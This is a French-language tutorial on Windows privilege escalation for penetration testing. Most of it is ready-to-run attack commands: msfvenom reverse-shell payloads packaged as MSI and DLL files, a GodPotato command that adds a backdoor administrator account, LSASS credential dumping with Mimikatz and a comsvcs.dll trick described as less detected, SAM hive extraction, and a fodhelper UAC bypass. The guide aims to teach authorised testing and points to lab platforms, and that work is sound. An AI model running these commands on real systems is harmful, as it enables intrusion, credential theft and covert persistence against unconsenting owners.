# Élévation de privilèges Windows : techniques avancées

L'élévation de privilèges sur Windows est une étape clé de tout pentest. Passer d'un utilisateur standard à SYSTEM ou Administrateur ouvre toutes les portes. Voici les techniques les plus utilisées.

## Contexte Windows

### Niveaux de privilèges
- **User standard** : droits limités, pas d'accès aux zones sensibles
- **Administrateur local** : droits élevés sur la machine locale
- **SYSTEM** : compte le plus puissant, utilisé par le système d'exploitation
- **Administrateur de domaine** : droits sur tout le domaine Active Directory

### Outils essentiels
- **WinPEAS** : script d'énumération automatisé
- **PowerUp** : module PowerShell pour la privesc
- **SharpUp** : version C# de PowerUp
- **BeRoot** : outil d'énumération multi-plateforme

## Énumération manuelle

```powershell
# Informations système
systeminfo
hostname
whoami /all          # Droits et groupes de l'utilisateur courant
whoami /priv         # Privilèges détaillés

# Utilisateurs et groupes
net user
net localgroup administrators
net user USERNAME

# Processus
tasklist /SVC
Get-Process | Select-Object Name, Id, Path

# Services
sc query
Get-Service
wmic service list brief

# Réseau
ipconfig /all
netstat -ano
route print
```

## Vecteurs courants

### 1. AlwaysInstallElevated

Si cette politique est activée, tous les installeurs MSI s'exécutent avec les droits SYSTEM.

```powershell
# Vérifier
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si les deux valeurs = 1, créer un MSI malveillant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o exploit.msi

# Exécuter sur la cible
msiexec /quiet /qn /i exploit.msi
```

### 2. Services mal configurés

```powershell
# Services avec chemin non entre guillemets (Unquoted Service Path)
wmic service get name,displayname,pathname,startmode | 
  findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Exemple vulnérable :
# C:\Program Files\My App\service.exe
# Windows cherche dans l'ordre :
# C:\Program.exe
# C:\Program Files\My.exe  ← Créer ce fichier !
# C:\Program Files\My App\service.exe

# Vérifier les permissions sur les binaires de services
icalcs "C:\Program Files\Vulnerable Service\service.exe"
# Si BUILTIN\Users: (F) → remplacer le binaire

# Avec PowerUp
Import-Module .\PowerUp.ps1
Get-ServiceUnquoted
Get-ModifiableServiceFile
```

### 3. Tâches planifiées

```powershell
# Lister les tâches planifiées
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

# Vérifier si le script exécuté est modifiable
Get-ScheduledTask | Select-Object TaskName, TaskPath, 
  @{N='Execute';E={$_.Actions.Execute}}
```

### 4. DLL Hijacking

Windows cherche les DLLs dans un ordre précis. Si un dossier dans le PATH est writable, vous pouvez y placer une DLL malveillante.

```powershell
# Trouver les DLLs manquantes avec Process Monitor (Sysinternals)
# Filtrer : Result = NAME NOT FOUND, Path ends with .dll

# Vérifier les dossiers dans le PATH
$env:PATH -split ";" | ForEach-Object { 
    if (Test-Path $_) { Get-Acl $_ | Select-Object Path, Access }
}

# Créer la DLL malveillante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 \
  -f dll -o malicious.dll
```

### 5. Tokens d'impersonation

Si vous avez le privilège `SeImpersonatePrivilege` (compte de service, IIS...) :

```powershell
# Vérifier les privilèges
whoami /priv

# Si SeImpersonatePrivilege présent :
# Outils : PrintSpoofer, GodPotato, JuicyPotato, RoguePotato

# PrintSpoofer (Windows 10/Server 2019+)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (le plus récent, très fiable)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

### 6. Mots de passe dans le registre

```powershell
# Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Mots de passe putty
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# Mots de passe enregistrés
cmdkey /list
```

### 7. Dumper les credentials

```powershell
# LSASS (nécessite SYSTEM ou admin)
# Avec Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Avec rundll32 (moins détecté)
rundll32 C:\windows\system32\comsvcs.dll MiniDump 
  (Get-Process lsass).Id C:\temp\lsass.dmp full

# SAM database (hors ligne)
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
# Puis sur votre machine :
impacket-secretsdump -system system.hive -sam sam.hive LOCAL
```

## WinPEAS — Énumération automatisée

```powershell
# Télécharger et exécuter
.\winPEASx64.exe

# Version colorée (plus lisible)
.\winPEASx64.exe quiet

# Sauvegarder la sortie
.\winPEASx64.exe > C:\temp\winpeas_output.txt
```

## Bypass UAC

Si vous êtes administrateur mais pas élevé :

```powershell
# Vérifier le niveau UAC
(Get-ItemProperty 
  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").ConsentPromptBehaviorAdmin

# Techniques de bypass UAC
# fodhelper.exe (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

## Conclusion

La privesc Windows est un domaine riche qui évolue constamment. WinPEAS couvre 90% des cas automatiquement, mais comprendre les techniques manuelles reste indispensable. Pratiquez sur TryHackMe (room "Windows Privesc") et HackTheBox pour maîtriser ces vecteurs dans des contextes réels.
